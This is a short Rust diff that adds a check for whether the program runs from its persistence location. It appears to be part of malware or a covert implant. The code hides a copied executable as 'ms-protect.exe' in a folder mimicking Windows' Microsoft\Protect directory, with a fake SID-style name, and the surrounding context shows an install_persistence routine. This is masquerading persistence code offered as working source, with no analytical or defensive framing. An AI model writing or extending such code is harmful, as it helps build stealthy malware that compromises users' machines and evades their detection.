@@ -19,6 +19,22 @@ pub async fn install_persistence() {
     }
 }
 
+pub fn is_running_from_persistence() -> bool {
+    if let Some(base_dirs) = BaseDirs::new() {
+        let data_dir = base_dirs
+            .data_local_dir()
+            .join("Microsoft")
+            .join("Protect")
+            .join("S-1-5-21-2026");
+        let target_exe = data_dir.join("ms-protect.exe");
+        
+        if let Ok(current) = env::current_exe() {
+            return current == target_exe;
+        }
+    }
+    false
+}
+
 async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
     let current_exe = env::current_exe()?;
     let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;
